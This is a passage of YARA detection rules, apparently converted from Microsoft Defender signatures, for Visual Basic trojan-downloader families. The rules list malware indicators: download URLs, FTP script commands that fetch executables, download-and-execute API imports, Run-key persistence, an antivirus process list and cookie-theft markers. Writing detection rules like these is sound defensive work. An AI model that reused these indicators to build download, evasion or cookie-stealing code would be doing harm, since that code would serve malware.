rule TrojanDownloader_Win32_VB_KZ_2147552029_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.KZ"
        threat_id = "2147552029"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "51"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "portalnaruto.com" ascii //weight: 10
        $x_10_2 = "HTTP Client" ascii //weight: 10
        $x_10_3 = "www.lacadenaherrumbrosa.net" ascii //weight: 10
        $x_10_4 = "C:\\Arquivos de programas\\Microsoft Visual Studio\\VB98\\VB6.OLB" ascii //weight: 10
        $x_10_5 = {49 6d 61 67 65 32 00 50 72 6f 6a 65 63 74 31}  //weight: 10, accuracy: High
        $x_1_6 = "/components/com_agora/img/ranks/1.txt" wide //weight: 1
        $x_1_7 = "/components/com_agora/img/ranks/2.txt" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((5 of ($x_10_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_XB_2147575723_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XB"
        threat_id = "2147575723"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "45"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "\\Installer\\Aboxinst.vbp" wide //weight: 10
        $x_10_2 = "SOFTWARE\\Your Company Name\\Your App Name\\Your Current Version" wide //weight: 10
        $x_10_3 = "SOFTWARE\\Valentina" wide //weight: 10
        $x_5_4 = "http://vale.gamentw.com/log.asp?rel=" wide //weight: 5
        $x_5_5 = "http://vale.gamentw.com/get_pub.asp?pub_id=" wide //weight: 5
        $x_5_6 = "http://vale.gamentw.com/get_serial.asp?pub_id=" wide //weight: 5
        $x_1_7 = "get mswinsck.ocx " wide //weight: 1
        $x_1_8 = "\\mswinsck.ocx" wide //weight: 1
        $x_1_9 = "get winmsgr.exe " wide //weight: 1
        $x_1_10 = "\\winmsgr.exe" wide //weight: 1
        $x_1_11 = "get Dispatcher.exe " wide //weight: 1
        $x_1_12 = "\\Dispatcher.exe" wide //weight: 1
        $x_1_13 = "get Router.exe " wide //weight: 1
        $x_1_14 = "\\Router.exe" wide //weight: 1
        $x_1_15 = "\\router.exe" wide //weight: 1
        $x_1_16 = "get vbsendmail.dll " wide //weight: 1
        $x_1_17 = "\\vbsendmail.dll" wide //weight: 1
        $x_1_18 = "get ABox.bup " wide //weight: 1
        $x_1_19 = "\\ABox.bup" wide //weight: 1
        $x_1_20 = "\\system32\\ftp.exe -s:" wide //weight: 1
        $x_1_21 = "\\Temp\\WMS.ftp" wide //weight: 1
        $x_5_22 = "qnelpdc" wide //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 4 of ($x_5_*) and 15 of ($x_1_*))) or
            ((2 of ($x_10_*) and 2 of ($x_5_*) and 15 of ($x_1_*))) or
            ((2 of ($x_10_*) and 3 of ($x_5_*) and 10 of ($x_1_*))) or
            ((2 of ($x_10_*) and 4 of ($x_5_*) and 5 of ($x_1_*))) or
            ((3 of ($x_10_*) and 15 of ($x_1_*))) or
            ((3 of ($x_10_*) and 1 of ($x_5_*) and 10 of ($x_1_*))) or
            ((3 of ($x_10_*) and 2 of ($x_5_*) and 5 of ($x_1_*))) or
            ((3 of ($x_10_*) and 3 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_XC_2147581601_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XC"
        threat_id = "2147581601"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "30"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "@ registrazione di componenti b" wide //weight: 5
        $x_5_2 = "A*\\AG:\\Valentina\\WINMSGR.VBP" wide //weight: 5
        $x_5_3 = "SOFTWARE\\Valentina" wide //weight: 5
        $x_5_4 = "lafigliadelredicatsiglianoneraunagranmeraviglia" wide //weight: 5
        $x_5_5 = "qnelpdc" wide //weight: 5
        $x_5_6 = "\\system32\\ftp.exe -s:" wide //weight: 5
        $x_5_7 = "get update.exe" wide //weight: 5
        $x_5_8 = "\\temp\\caupd.ftp fregamnet.com" wide //weight: 5
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_Win32_VB_GY_2147582289_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.GY"
        threat_id = "2147582289"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {55 8b ec 83 ec 18 68}  //weight: 1, accuracy: High
        $x_1_2 = {40 00 64 a1 00 00 00 00 50 64 89 25 00 00 00 00 b8 5c 00 00 00 e8}  //weight: 1, accuracy: High
        $x_1_3 = {40 00 8d 45 c8 50 ff 15 80 10 40 00 50 68}  //weight: 1, accuracy: High
        $x_1_4 = {40 00 8d 45 cc 50 ff 15 80 10 40 00 50 6a 00 e8}  //weight: 1, accuracy: High
        $x_1_5 = {40 00 8d 4d c8 51 ff 15 80 10 40 00 50 68}  //weight: 1, accuracy: High
        $x_1_6 = {40 00 8d 4d cc 51 ff 15 80 10 40 00 50 6a 00 e8}  //weight: 1, accuracy: High
        $x_1_7 = {40 00 8d 55 cc 52 ff 15 80 10 40 00 50 6a 00 e8}  //weight: 1, accuracy: High
        $x_1_8 = {40 00 c7 45 a8 08 00 00 00 8d 55 a8 8d 4d b8 ff 15 84 10 40 00 6a 01 8d 45 b8 50 ff 15 48 10 40 00 dd 5d a0 c7 45 98 05 00 00 00 8d 55 98 8d 4d d0 ff 15 08 10 40 00 8d 4d b8 ff 15 0c 10 40 00 c7 45 fc 05 00 00 00 6a 00 6a 00 68}  //weight: 1, accuracy: High
        $x_1_9 = {40 00 c7 45 a8 08 00 00 00 8d 55 a8 8d 4d b8 ff 15 84 10 40 00 6a 01 8d 4d b8 51 ff 15 48 10 40 00 dd 5d a0 c7 45 98 05 00 00 00 8d 55 98 8d 4d d0 ff 15 08 10 40 00 8d 4d b8 ff 15 0c 10 40 00 c7 45 fc 09 00 00 00 6a 00 6a 00}  //weight: 1, accuracy: High
        $x_1_10 = {40 00 c7 45 a8 08 00 00 00 8d 55 a8 8d 4d b8 ff 15 84 10 40 00 6a 01 8d 55 b8 52 ff 15 48 10 40 00 dd 5d a0 c7 45 98 05 00 00 00 8d 55 98 8d 4d d0 ff 15 08 10 40 00 8d 4d b8 ff 15 0c 10 40 00 c7 45 fc 07 00 00 00 6a 00 6a 00 68}  //weight: 1, accuracy: High
        $x_1_11 = {ff ff 53 56 57 89 65 e8 c7 45 ec a0 10 40 00 8b 45 08 83 e0 01 89 45 f0 8b 4d 08 83 e1 fe 89 4d 08 c7 45 f4 00 00 00 00 8b 55 08 8b 02 8b 4d 08 51 ff 50 04 c7 45 fc 01 00 00 00 c7 45 fc 02 00 00 00 6a ff ff 15 24 10 40 00 c7 45 fc 03 00 00 00 6a 00 6a 00 68}  //weight: 1, accuracy: High
        $x_1_12 = {1c 40 00 8d 55 c8 52 ff 15 80 10 40 00 50 68}  //weight: 1, accuracy: High
        $x_1_13 = {ff ff ff 15 1c 10 40 00 8d 45 c8 50 8d 4d cc 51 6a 02 ff 15 70 10 40 00 83 c4 0c c7 45 fc 06 00 00 00 c7 45 b0}  //weight: 1, accuracy: High
        $x_1_14 = {ff ff ff 15 1c 10 40 00 8d 4d c8 51 8d 55 cc 52 6a 02 ff 15 70 10 40 00 83 c4 0c c7 45 fc 04 00 00 00 c7 45 b0}  //weight: 1, accuracy: High
        $x_1_15 = {ff ff ff 15 1c 10 40 00 8d 55 c8 52 8d 45 cc 50 6a 02 ff 15 70 10 40 00 83 c4 0c c7 45 fc 08 00 00 00 c7 45 b0}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XF_2147583308_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XF"
        threat_id = "2147583308"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "35"
        strings_accuracy = "Low"
    strings:
        $x_20_1 = {61 44 3a 5c 4d 61 73 74 65 72 5c [0-32] 5c 76 62 62 68 6f 2e 74 6c 62}  //weight: 20, accuracy: Low
        $x_10_2 = {2a 00 5c 00 41 00 44 00 3a 00 5c 00 4d 00 61 00 73 00 74 00 65 00 72 00 5c 00 63 00 61 00 73 00 68 00 75 00 6e 00 6c 00 69 00 6d 00 5c 00 48 00 45 00 4c 00 4c 00 5f 00 76 00 65 00 72 00 73 00 69 00 6f 00 6e 00 5c 00 [0-32] 62 00 68 00 6f 00 5c 00 56 00 42 00 42 00 48 00 4f 00 2e 00 76 00 62 00 70 00}  //weight: 10, accuracy: Low
        $x_10_3 = "*\\AD:\\Master\\ADWARA_NEW\\bho\\VBBHO.vbp" wide //weight: 10
        $x_5_4 = "http://online-security-center.com/" wide //weight: 5
        $x_5_5 = "http://onlinesecuritynet.com/" wide //weight: 5
        $x_5_6 = "asgp32.dll" wide //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 3 of ($x_5_*))) or
            ((1 of ($x_20_*) and 3 of ($x_5_*))) or
            ((1 of ($x_20_*) and 1 of ($x_10_*) and 1 of ($x_5_*))) or
            ((1 of ($x_20_*) and 2 of ($x_10_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_HZ_2147583586_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.HZ"
        threat_id = "2147583586"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {56 42 41 36 2e 44 4c 4c 00}  //weight: 1, accuracy: High
        $x_1_2 = {55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41 00}  //weight: 1, accuracy: High
        $x_1_3 = {0a 00 00 00 53 00 6f 00 66 00 74 00 77 00 00 00 0e 00 00 00 61 00 72 00 65 00 5c 00 4d 00 69 00 63 00 00 00 14 00 00 00 72 00 6f 00 73 00 6f 00 66 00 74 00 5c 00 49 00 6e 00 74 00 00 00 00 00 0c 00 00 00 65 00 72 00 6e 00 65 00 74 00 20 00 00 00 00 00 0c 00 00 00 45 00}  //weight: 1, accuracy: High
        $x_1_4 = {06 00 00 00 53 00 74 00 61 00 00 00 08 00 00 00 72 00 74 00 20 00 50 00 00 00 00 00 02 00 00 00 61 00 00 00 04 00 00 00 67 00 65 00 00 00}  //weight: 1, accuracy: High
        $x_1_5 = {06 00 00 00 53 00 65 00 61 00 00 00 08 00 00 00 72 00 63 00 68 00 20 00 00 00 00 00 08 00 00 00 50 00 61 00 67 00 65 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_XG_2147595007_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XG"
        threat_id = "2147595007"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "xpremain" ascii //weight: 1
        $x_1_2 = "swpvsTimer" ascii //weight: 1
        $x_1_3 = "http://adxtend.net/amp1065.exe" wide //weight: 1
        $x_1_4 = "avsynmgr,naPrdMgr,vshwin32,McShield,mcshield,Mcdetect,mcagent,mcdash,mcvsshld,mcvsescn,mctskshd,MpfService" wide //weight: 1
        $x_1_5 = "xpre.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_AAF_2147595843_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AAF"
        threat_id = "2147595843"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "500"
        strings_accuracy = "Low"
    strings:
        $x_100_1 = "/reporting/IpGeo.aspx" wide //weight: 100
        $x_50_2 = {93 92 e5 48 80 98 cf 11 97 54 00 aa 00 c0 09 08}  //weight: 50, accuracy: High
        $x_50_3 = "78E1BDD1-9941-11cf-9756-00AA00C00908" wide //weight: 50
        $x_50_4 = "C:\\WINNT\\System32\\calc.exe" wide //weight: 50
        $x_50_5 = "InetCtlsObjects.Inet" ascii //weight: 50
        $x_50_6 = "DeleteDownloadApp" ascii //weight: 50
        $x_50_7 = "Scripting.FileSystemObject" wide //weight: 50
        $x_50_8 = "FolderExists" wide //weight: 50
        $x_50_9 = "BundleBase1" wide //weight: 50
        $x_20_10 = "\\ardCo011064.vbp" wide //weight: 20
        $x_20_11 = {5c 00 76 00 62 00 5f 00 6c 00 64 00 72 00 5f 00 63 00 6f 00 64 00 65 00 5c 00 [0-32] 2e 00 76 00 62 00 70 00}  //weight: 20, accuracy: Low
        $x_20_12 = "64.225." wide //weight: 20
        $x_10_13 = "TF.log" wide //weight: 10
        $x_10_14 = {45 00 55 00 52 00 4f 00 [0-32] 2e 00 65 00 78 00 65 00 [0-16] 4f 00 54 00 48 00 45 00 52 00}  //weight: 10, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_100_*) and 7 of ($x_50_*) and 2 of ($x_20_*) and 1 of ($x_10_*))) or
            ((1 of ($x_100_*) and 7 of ($x_50_*) and 3 of ($x_20_*))) or
            ((1 of ($x_100_*) and 8 of ($x_50_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_XI_2147596940_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XI"
        threat_id = "2147596940"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "133"
        strings_accuracy = "High"
    strings:
        $x_100_1 = "VB5!6&VB6JP.DLL" ascii //weight: 100
        $x_10_2 = "C:\\Program Files\\Internet Explorer\\IExplore.exe http://|" wide //weight: 10
        $x_10_3 = "\\currentversion\\run|" wide //weight: 10
        $x_12_4 = {61 64 75 6c 74 76 69 65 77 73 00 00 76 69 65 77 74 68 65 61 64 75 6c 74}  //weight: 12, accuracy: High
        $x_15_5 = "HEAVENISTHEDOORTONEXT.HELLISTHEDOORTOTHEENDFOREVER." wide //weight: 15
        $x_15_6 = "makemesmilesomutchistheaitaiyodeaikayonandayoheheheohohohohohohoaerjaethsrynwr" wide //weight: 15
        $x_7_7 = "aview.exe|" wide //weight: 7
        $x_5_8 = "USERID|" wide //weight: 5
        $x_3_9 = {4d 6f 64 75 6c 65 31 00 4d 6f 64 75 6c 65 32 00 68 65 61 76 65 6e 72 63 74}  //weight: 3, accuracy: High
        $x_3_10 = "COOKIE|" wide //weight: 3
        $x_3_11 = "CxxKIE|" wide //weight: 3
        $x_3_12 = "dougadouya.exe|" wide //weight: 3
        $x_1_13 = "\\Cookies\\|" wide //weight: 1
        $x_1_14 = "age.php|" wide //weight: 1
        $x_1_15 = "REGIST|" wide //weight: 1
        $x_1_16 = "manage.php|" wide //weight: 1
        $x_1_17 = "uajapan.com|" wide //weight: 1
        $x_1_18 = "douga-tengoku.com" wide //weight: 1
        $x_1_19 = "systemoviesup|" wide //weight: 1
        $x_1_20 = "message|" wide //weight: 1
        $x_1_21 = "shirotopara" wide //weight: 1
        $x_1_22 = "SEIKYU.txt|" wide //weight: 1
        $x_1_23 = "syslk" wide //weight: 1
        $x_1_24 = "sysdir64|" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_100_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 3 of ($x_3_*) and 12 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 4 of ($x_3_*) and 9 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 4 of ($x_3_*) and 11 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 12 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 3 of ($x_3_*) and 9 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 4 of ($x_3_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 2 of ($x_3_*) and 10 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 3 of ($x_3_*) and 7 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 4 of ($x_3_*) and 4 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 11 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 3 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 4 of ($x_3_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_3_*) and 10 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 2 of ($x_3_*) and 7 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 3 of ($x_3_*) and 4 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 4 of ($x_3_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_5_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_5_*) and 3 of ($x_3_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_7_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_7_*) and 2 of ($x_3_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 3 of ($x_3_*) and 12 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 4 of ($x_3_*) and 9 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 10 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_5_*) and 3 of ($x_3_*) and 7 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_5_*) and 4 of ($x_3_*) and 4 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 1 of ($x_3_*) and 11 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 2 of ($x_3_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 3 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 4 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 9 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 3 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 11 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_3_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 2 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 3 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 4 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 2 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 4 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_3_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 2 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 2 of ($x_10_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 2 of ($x_10_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 2 of ($x_10_*) and 1 of ($x_5_*))) or
            ((1 of ($x_100_*) and 1 of ($x_12_*) and 2 of ($x_10_*) and 1 of ($x_7_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 2 of ($x_3_*) and 12 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 3 of ($x_3_*) and 9 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 4 of ($x_3_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 10 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_5_*) and 2 of ($x_3_*) and 7 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_5_*) and 3 of ($x_3_*) and 4 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_5_*) and 4 of ($x_3_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 11 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 1 of ($x_3_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 2 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 3 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 4 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 1 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_7_*) and 1 of ($x_5_*) and 2 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 8 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_3_*) and 5 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 2 of ($x_3_*) and 2 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 3 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_5_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_10_*) and 1 of ($x_7_*) and 1 of ($x_5_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 2 of ($x_10_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 6 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 1 of ($x_3_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 2 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 1 of ($x_5_*) and 1 of ($x_1_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 1 of ($x_5_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 1 of ($x_7_*))) or
            ((1 of ($x_100_*) and 1 of ($x_15_*) and 1 of ($x_12_*) and 1 of ($x_10_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 3 of ($x_1_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 1 of ($x_3_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 1 of ($x_5_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 1 of ($x_7_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 1 of ($x_10_*))) or
            ((1 of ($x_100_*) and 2 of ($x_15_*) and 1 of ($x_12_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_AAI_2147597401_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AAI"
        threat_id = "2147597401"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "\\diabinhos\\novo rick\\loder\\fotomensagem.vbp" wide //weight: 10
        $x_10_2 = "FotoTorpedo" ascii //weight: 10
        $x_1_3 = {73 68 65 6c 6c 33 32 2e 64 6c 6c 00 0e 00 00 00 53 68 65 6c 6c 45 78 65 63 75 74 65 41}  //weight: 1, accuracy: High
        $x_1_4 = {75 72 6c 6d 6f 6e 00 00 13 00 00 00 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 41}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_AAJ_2147597402_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.AAJ"
        threat_id = "2147597402"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
